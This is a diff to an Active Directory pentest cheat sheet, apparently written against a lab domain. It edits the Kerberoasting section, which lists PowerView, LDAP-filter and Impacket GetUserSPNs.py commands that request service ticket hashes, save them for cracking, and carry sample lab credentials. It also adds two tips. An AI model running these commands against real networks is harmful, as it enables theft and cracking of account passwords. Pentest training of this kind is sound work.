@@ -635,16 +635,20 @@ Get-ADUser -LdapFilter "(&(objectclass=user)(objectcategory=user)(useraccountcon
 ## 6.2 Kerberoasting
 
 ```
-https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+
+# 1. powerview
 Invoke-Kerberoast -OutputFormat Hashcat | % {$_.hash} | Out-File -Encoding ascii hash.txt
 
-# 1. LDAP filter (PowerShell / AD Module style)
+# 2. LDAP filter (PowerShell / AD Module style)
 Get-ADUser -LDAPFilter "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" -Properties ServicePrincipalName
 
-# 2. Impacket’s GetUserSPNs.py
+# 3. Impacket’s GetUserSPNs.py
 GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/hodor:hodor -outputfile kerberoasting.hashes
 
 ```
+### TIPS:
+* If nothing comes back → there are no enabled user accounts with SPNs → nothing to kerberoast.
+* Many modern environments register services under machine accounts, not user accounts.
 
 
 ### Refrences
